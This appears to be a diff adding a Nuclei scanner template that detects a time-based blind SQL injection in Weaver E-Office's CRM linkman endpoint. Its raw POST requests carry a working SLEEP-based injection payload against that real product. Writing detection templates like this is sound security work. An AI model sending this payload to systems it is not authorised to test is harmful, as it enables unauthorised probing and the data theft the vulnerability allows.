@@ -1,0 +1,53 @@
+id: weaver-eoffice-sql-injection
+info:
+  name: Weaver E-Office SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver E-office contains a SQL injection vulnerability allowing attackers to access sensitive user information like account details, passwords, and phone numbers.
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.1
+    cwe-id: CWE-89
+  tags: sql-injection, time-based-blind
+  reference:
+    - https://www.weaver.com.cn/
+
+variables:
+  sleep_payload: "linkman_id=1 AND (SELECT 5830 FROM (SELECT(SLEEP(5)))mDdD)"
+
+http:
+  - raw:
+      - |
+        POST /general/crm/linkman/query/detail.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=eff067b73c42eed28e55fd037563593a; LOGIN_LANG=cn; expires=Tue, 22-Apr-2025 14:54:24 GMT
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+        Content-Length: 85
+
+        linkman_id=-1
+    extractors:
+      - type: regex
+        name: initial_response
+        internal: true
+        regex:
+          - "No such file or directory in"
+
+  - raw:
+      - |
+        POST /general/crm/linkman/query/detail.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=eff067b73c42eed28e55fd037563593a; LOGIN_LANG=cn; expires=Tue, 22-Apr-2025 14:54:24 GMT
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+        Content-Length: 85
+
+        {{sleep_payload}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "No such file or directory in"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > 5"
